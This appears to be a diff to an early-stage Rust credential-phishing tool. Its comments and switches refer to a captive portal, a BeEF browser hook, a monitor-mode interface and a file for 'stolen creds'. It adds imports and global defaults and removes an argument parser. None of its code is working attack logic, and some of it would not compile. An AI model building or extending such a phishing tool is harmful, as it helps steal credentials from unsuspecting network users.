@@ -1,6 +1,7 @@
 /*
 Total conversion of the project to Rust
 */
+extern crate clap;
 
 //Basic stuff
 use std::char;
@@ -8,6 +9,7 @@ use std::thread;
 use std::time::Duration;
 use std::io::{self, Write};
 use termcolor::{Color, ColorChoice, ColorSpec, StandardStream, WriteColor};
+use clap::{Arg, App};
 
 //Ncurses
 extern crate ncurses;
@@ -18,6 +20,14 @@ use ncurses::*;
 use std::net::TcpListener;
 use std::io::prelude::*;
 use std::net::TcpStream;
+
+/* Term Color Function */
+fn termcolorprint(text_color, text ) -> io::Result<()> {
+  let mut stdout = StandardStream::stdout(ColorChoice::Always);
+  stdout.set_color(ColorSpec::new().set_fg(Some(Color::text_color)))?;
+  writeln!(&mut stdout, text)
+};
+
 
 /*HTML for the login*/
 //Add beef hook conditional to replace normal stuff with mean stuff
@@ -52,24 +62,25 @@ use std::net::TcpStream;
 */
 
 
+// Some variables for static things
 
+// Assign the following two by getting terminal dimensions
+let height_rows               = 0;
+let width_columns             = 0;
 
+// set by finding minimum size necessary for properly displaying the data
+// presented
+let mut init_display_height   = 0;
+let mut init_display_width    = 0;  
 
-fn parse_commandline_arguments(){
+// Defaults for beefhook, captive portal, and ncurses switches
+let hook                      = true;
+let PORTAL                    = true;
+let PORT                      = 80;
+let curses                    = true;
 
-    let args: Vec<String> = env::args().collect();
-    let help          = &args[1];    // Shows the help
-    let ADDRESS       = &args[2];    // IP address to use for server
-    let PORT          = &args[3];    // port to use
-    let INTERFACE     = &args[4];    // interface to use in monitor mode
-    let CREDENTIALS   = &args[5];    // filename to save stolen creds to
-    let DOCUMENT_ROOT = &args[6];    // doc root of server
-    let EXTERNAL_HTML = &args[7];    //bool switch for serving external document instead of internal form
-    let BEEF_HOOK     = &args[8];    // switch for beef hook
-    let PORTAL        = &args[9];      // Trigger to actually implement the redirect
-    let TBD           = &args[10];    // TO BE DECIDED
-
-}
+// Path to the file for storing credentials.
+let credentials_file          = "/path/to/file";
 
 // add an error logger HERE maybe?
 fn termcolorprint(text_color, text ) -> io::Result<()> {
